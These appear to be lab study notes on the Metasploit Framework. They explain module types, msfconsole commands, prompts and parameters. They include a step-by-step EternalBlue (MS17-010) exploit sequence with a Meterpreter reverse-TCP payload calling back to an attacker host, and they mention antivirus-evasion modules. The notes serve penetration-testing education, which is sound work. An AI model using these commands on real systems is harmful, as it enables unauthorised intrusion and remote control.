
## Main Components of Metasploit:

### **Key Concepts**
- **Exploit:** Code leveraging a vulnerability in the target system.
- **Vulnerability:** A flaw in design, coding, or logic enabling exploitation.
- **Payload:** Code executed on the target system, e.g., gaining a shell or running commands.


### **Metasploit Modules**

1. **Auxiliary:**
   - Supporting tools like scanners, crawlers, fuzzers, etc.
   - Path: `/modules/auxiliary/`

2. **Encoders:**
   - Encodes payloads to bypass signature-based antivirus solutions.
   - Limited success against advanced security measures.
   - Path: `/modules/encoders/`

3. **Evasion:**
   - Focused on bypassing antivirus and security tools.
   - Example modules: `windows_defender_exe.rb`, `process_herpaderping.rb`
   - Path: `/modules/evasion/`

4. **Exploits:**
   - Organized by target systems, e.g., Linux, Windows, Android.
   - Used to exploit vulnerabilities.
   - Path: `/modules/exploits/`

5. **NOPs (No Operation):**
   - Used as buffers to ensure consistent payload sizes.
   - Path: `/modules/nops/`

6. **Payloads:**
   - Code that runs on the target system, enabling desired actions.
   - Types:
     - **Adapters:** Convert payloads into different formats (e.g., PowerShell).
     - **Singles:** Self-contained payloads.
     - **Stagers:** Set up a connection for staged payloads.
     - **Stages:** Downloaded components for staged payloads.
   - Path: `/modules/payloads/`

   **Examples:**
   - Inline (single): `generic/shell_reverse_tcp`
   - Staged: `windows/x64/shell/reverse_tcp`

7. **Post:**
   - Modules for post-exploitation tasks (e.g., data extraction, privilege escalation).
   - Path: `/modules/post/`


### **Usage Tips**
- Use `msfconsole` as the primary interface for managing modules.
- Modules are organized under `/opt/metasploit-framework/embedded/framework/modules/` (on AttackBox).

---
---

### **What is msfconsole?**
The msfconsole is the primary command-line interface to the Metasploit Framework. It allows you to interact with Metasploit's features, manage exploits, and execute commands. To launch it, type `msfconsole` in your terminal.


### **Key Features and Commands**
1. **Basic Usage**
   - Launch with `msfconsole`.
   - Linux commands like `ls`, `ping`, and `clear` work within the console, though some features (e.g., output redirection) are limited.

2. **Help and History**
   - Use `help` to view available commands or get details on a specific command (e.g., `help set`).
   - `history` shows previously executed commands.

3. **Module Context**
   - When selecting a module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`), the prompt changes to indicate the module context.
   - Commands like `show options` list settings required for the selected module.
   - Use `back` to exit the module context.

4. **Auto-Completion**
   - Press `Tab` to autocomplete commands or module names (e.g., typing `he` and pressing `Tab` completes to `help`).

5. **Module Information**
   - Use `info` within a module to get detailed descriptions, requirements, and payload compatibility.


### **Exploit Example: EternalBlue**
- EternalBlue is a vulnerability affecting SMBv1 servers, famously exploited in the WannaCry ransomware attack.
- Select the module:
  ```bash
  use exploit/windows/smb/ms17_010_eternalblue
  ```
- View module options:
  ```bash
  show options
  ```
- Set parameters (e.g., target IP address and port):
  ```bash
  set RHOSTS <target IP>
  set RPORT <port number>
  ```
- List compatible payloads:
  ```bash
  show payloads
  ```
- Run the exploit:
  ```bash
  run
  ```

### **Useful Commands**
- `show` – Lists available modules (e.g., exploits, payloads, auxiliaries).
- `set` – Sets module parameters.
- `unset` – Clears a set parameter.
- `sessions` – Manages active sessions.
- `search` – Finds modules by name or CVE (e.g., `search cve:2017-0143`).


### **Tips**
- **Global Variables:** Use the `-g` flag with `set` to make settings persistent across modules.
- **Sessions:** Post-exploitation modules often require an active session ID (viewable with `sessions`).

---
---


### **Key Prompts in Metasploit**
1. **Regular Command Prompt**: System's shell, not related to Metasploit commands.  
   Example: `root@ip-10-10-XX-XX:~#`

2. **Metasploit Prompt**: Default Metasploit shell where no module is active.  
   Example: `msf6 >`

3. **Module Context Prompt**: When a specific module is selected.  
   Example: `msf6 exploit(windows/smb/ms17_010_eternalblue) >`

4. **Meterpreter Prompt**: When a Meterpreter payload successfully connects to the target system.  
   Example: `meterpreter >`

5. **Target Shell Prompt**: Command-line access on the compromised target.  
   Example: `C:\Windows\system32>`


### **Common Commands**
- **`use`**: Enter the context of a specific module.  
  Example: `use exploit/windows/smb/ms17_010_eternalblue`

- **`show options`**: Display required parameters for a module.  

- **`set`**: Set specific module parameters.  
  Syntax: `set PARAMETER_NAME VALUE`  
  Example: `set RHOSTS 10.10.165.39`

- **`unset`**: Clear a parameter value.  
  Example: `unset RHOSTS`

- **`unset all`**: Clear all set parameters.  

- **`setg`**: Set global parameters for use across all modules.  
  Example: `setg LHOST 10.10.44.70`

- **`unsetg`**: Clear global parameters.  

- **`back`**: Exit the current module context and return to the Metasploit prompt.


### **Frequently Used Parameters**
1. **RHOSTS**: Target IP address or range (CIDR-supported).  
   Example: `set RHOSTS 10.10.165.39`

2. **RPORT**: Port on the target system. Default varies by module (e.g., 445 for SMB).  
   Example: `set RPORT 445`

3. **PAYLOAD**: Payload used with the exploit.  
   Example: `windows/x64/meterpreter/reverse_tcp`

4. **LHOST**: Local attacker's IP for the reverse connection.  
   Example: `set LHOST 10.10.44.70`

5. **LPORT**: Local port for the reverse connection.  
   Example: `set LPORT 4444`

6. **SESSION**: Specify a session ID for post-exploitation modules.


### **Running Modules**
- **`exploit`**: Execute the module.  
- **`run`**: Alias for `exploit`, typically used for non-exploit modules.  

**Background Execution**:  
- Use `exploit -z` to run the exploit and background the session automatically.


### **Example Flow**
1. **Set up an exploit module**:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   setg RHOSTS 10.10.165.39
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 10.10.44.70
   set LPORT 4444
   exploit
   ```

2. **Switch to an auxiliary module**:
   ```bash
   back
   use auxiliary/scanner/smb/smb_ms17_010
   show options
   ```

3. **Unset global parameters**:
   ```bash
   unsetg RHOSTS
   ```

